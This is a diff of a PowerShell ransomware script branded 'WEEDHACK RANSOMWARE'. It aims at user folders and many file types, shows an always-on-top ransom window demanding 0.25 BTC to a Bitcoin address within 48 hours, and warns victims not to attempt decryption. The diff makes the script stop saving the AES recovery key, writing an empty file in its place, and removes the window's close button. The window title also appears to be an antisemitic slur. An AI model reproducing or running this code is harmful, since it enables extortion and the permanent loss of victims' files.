@@ -1,10 +1,10 @@
 $Target = "C:\Users"
-$Extension = ".weedhack"
+$Extension = ".thestarsabove"
 $Delay = 30
 $FileTypes = @('.txt', '.pdf', '.docx', '.xlsx', '.xls', '.doc', '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.mp4', '.avi', '.mkv', '.mp3', '.wav', '.zip', '.rar', '.7z', '.tar', '.gz', '.sql', '.mdb', '.db', '.json', '.xml', '.config', '.py', '.js', '.java', '.cpp', '.cs', '.html', '.css', '.php')
 
 Write-Host "========================================" -ForegroundColor Red
-Write-Host "          weed          " -ForegroundColor Red
+Write-Host "          WEEDHACK RANSOMWARE           " -ForegroundColor Red
 Write-Host "       Extension: $Extension            " -ForegroundColor Red
 Write-Host "       Targets: $($FileTypes.Count) file types" -ForegroundColor Red
 Write-Host "========================================" -ForegroundColor Red
@@ -61,83 +61,55 @@ Write-Host "`n`nEncrypted $count/$($files.Count) files with $Extension" -Foregro
 
 $keyB64 = [Convert]::ToBase64String($key)
 $ivB64 = [Convert]::ToBase64String($iv)
-"WEEDHACK RECOVERY KEY`n=====================`nAES Key (Base64): $keyB64`nAES IV (Base64): $ivB64`nFiles: $count`nExtension: $Extension" | 
-    Out-File "$env:USERPROFILE\Desktop\WEEDHACK_RECOVERY_KEY.txt"
+"" | 
+    Out-File "$env:USERPROFILE\Desktop\Y.txt"
 
-# Form
+
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+
 $form = New-Object Windows.Forms.Form
-$form.Size = New-Object Drawing.Size(720, 500)
-$form.Text = "OOPS! YOUR FILES HAVE BEEN ENCRYPTED"
+$form.Size = New-Object Drawing.Size(700, 400)
+$form.Text = "SUPER KOSHER RATING GROUP"
 $form.StartPosition = "CenterScreen"
 $form.TopMost = $true
-$form.FormBorderStyle = "FixedDialog"
-$form.BackColor = [Drawing.Color]::FromArgb(40, 44, 52)  # Dark background
 
-# Common font
-$fontHeader = New-Object Drawing.Font("Segoe UI", 14, [Drawing.FontStyle]::Bold)
-$fontNormal = New-Object Drawing.Font("Segoe UI", 11)
+$label = New-Object Windows.Forms.Label
+$label.Text = "OOPS! YOUR FILES ARE ENCRYPTED!"
+$label.AutoSize = $true
+$label.Location = New-Object Drawing.Size(20, 20)
+$label.Font = New-Object Drawing.Font("Arial", 12, [Drawing.FontStyle]::Bold)
+$form.Controls.Add($label)
 
-# Label: Title
-$labelTitle = New-Object Windows.Forms.Label
-$labelTitle.Text = "ALL OF YOUR FILES HAVE BEEN ENCRYPTED!"
-$labelTitle.AutoSize = $true
-$labelTitle.Location = New-Object Drawing.Point(20, 20)
-$labelTitle.ForeColor = [Drawing.Color]::White
-$labelTitle.Font = $fontHeader
-$form.Controls.Add($labelTitle)
+$label2 = New-Object Windows.Forms.Label
+$label2.Text = "Encrypted: $count files"
+$label2.AutoSize = $true
+$label2.Location = New-Object Drawing.Size(20, 60)
+$label2.Font = New-Object Drawing.Font("Arial", 10)
+$form.Controls.Add($label2)
 
-# Label: Encrypted files
-$labelFiles = New-Object Windows.Forms.Label
-$labelFiles.Text = "Encrypted: $count files"
-$labelFiles.AutoSize = $true
-$labelFiles.Location = New-Object Drawing.Point(20, 60)
-$labelFiles.ForeColor = [Drawing.Color]::LightGray
-$labelFiles.Font = $fontNormal
-$form.Controls.Add($labelFiles)
+$label3 = New-Object Windows.Forms.Label
+$label3.Text = "Send 0.25 BTC to: bc1q0lsa3tny22jndz74eaelzwdd6ydpaqwzzrzn4p"
+$label3.AutoSize = $true
+$label3.Location = New-Object Drawing.Size(20, 90)
+$label3.Font = New-Object Drawing.Font("Arial", 10, [Drawing.FontStyle]::Bold)
+$form.Controls.Add($label3)
 
-# Label: Send
-$labelSend = New-Object Windows.Forms.Label
-$labelSend.Text = "Send 0.25 Monero to: bc1qweedhackaddressxxxxxxxxxxxxx to get your files back"
-$labelSend.AutoSize = $true
-$labelSend.Location = New-Object Drawing.Point(20, 90)
-$labelSend.ForeColor = [Drawing.Color]::White
-$labelSend.Font = $fontNormal
-$form.Controls.Add($labelSend)
-
-# Textbox
 $textbox = New-Object Windows.Forms.TextBox
 $textbox.Multiline = $true
-$textbox.Text = "All your documents, images, videos, and archives have been encrypted.`n`nTo recover your files, you must pay 0.25 BTC within 48 hours.`n`n`nPayment address: bc1qweedhackaddressxxxxxxxxxxxxx`n`nDO NOT attempt to decrypt files yourself - you will lose them permanently.."
-$textbox.Size = New-Object Drawing.Size(660, 250)
-$textbox.Location = New-Object Drawing.Point(20, 120)
+$textbox.Text = "All your documents, images, videos, and archives have been encrypted.`n`nTo recover your files, you must pay 0.25 BTC within 48 hours.`n`n`nPayment address: bc1q0lsa3tny22jndz74eaelzwdd6ydpaqwzzrzn4p`n`nDO NOT attempt to decrypt files yourself - you will lose them permanently."
+$textbox.Size = New-Object Drawing.Size(650, 180)
+$textbox.Location = New-Object Drawing.Size(20, 120)
 $textbox.ReadOnly = $true
 $textbox.ScrollBars = "Vertical"
-$textbox.BackColor = [Drawing.Color]::FromArgb(60, 63, 70)
-$textbox.ForeColor = [Drawing.Color]::White
-$textbox.Font = $fontNormal
-$textbox.BorderStyle = "FixedSingle"
 $form.Controls.Add($textbox)
 
-# Timer Label
+$timer = $Delay
 $timerLabel = New-Object Windows.Forms.Label
-$timerLabel.Location = New-Object Drawing.Point(20, 390)
+$timerLabel.Location = New-Object Drawing.Size(20, 320)
 $timerLabel.AutoSize = $true
-$timerLabel.ForeColor = [Drawing.Color]::Orange
-$timerLabel.Font = New-Object Drawing.Font("Segoe UI", 16, [Drawing.FontStyle]::Bold)
-$timerLabel.Text = "Timer: $Delay"
+$timerLabel.Font = New-Object Drawing.Font("Arial", 14, [Drawing.FontStyle]::Bold)
 $form.Controls.Add($timerLabel)
-
-# Button example (if needed)
-$buttonClose = New-Object Windows.Forms.Button
-$buttonClose.Text = "Close"
-$buttonClose.Size = New-Object Drawing.Size(120, 35)
-$buttonClose.Location = New-Object Drawing.Point(560, 390)
-$buttonClose.Font = $fontNormal
-$buttonClose.BackColor = [Drawing.Color]::FromArgb(220, 53, 69)
-$buttonClose.ForeColor = [Drawing.Color]::White
-$buttonClose.FlatStyle = "Flat"
-$buttonClose.Add_Click({ $form.Close() })
-$form.Controls.Add($buttonClose)
 
 $form.Add_Shown({
     $timer = $Delay
@@ -154,4 +126,4 @@ $form.Add_Shown({
 [void]$form.ShowDialog()
 
 Write-Host "Ransom note displayed for $Delay seconds" -ForegroundColor Yellow
-Write-Host "Recovery key saved to Desktop" -ForegroundColor Yellow
+Write-Host "Recovery key saved to Desktop)" -ForegroundColor Yellow
